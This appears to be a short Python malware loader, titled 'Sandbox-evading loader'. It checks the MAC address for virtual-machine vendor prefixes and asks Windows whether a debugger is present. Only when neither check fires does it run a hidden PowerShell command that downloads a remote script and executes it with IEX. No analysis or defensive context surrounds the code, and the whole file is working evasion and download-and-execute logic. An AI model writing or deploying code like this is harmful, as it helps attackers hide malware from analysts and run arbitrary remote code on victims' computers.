# Sandbox-evading loader
import os, sys, subprocess, uuid

def is_vm():
    mac = f"{uuid.getnode():012x}"
    return mac.startswith(("080027", "000c29", "001c42"))

def is_debugged():
    import ctypes
    return ctypes.windll.kernel32.IsDebuggerPresent() != 0

if not (is_vm() or is_debugged()):
    subprocess.run(["powershell", "-c", "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/a.ps1')"],
                   creationflags=subprocess.CREATE_NO_WINDOW)
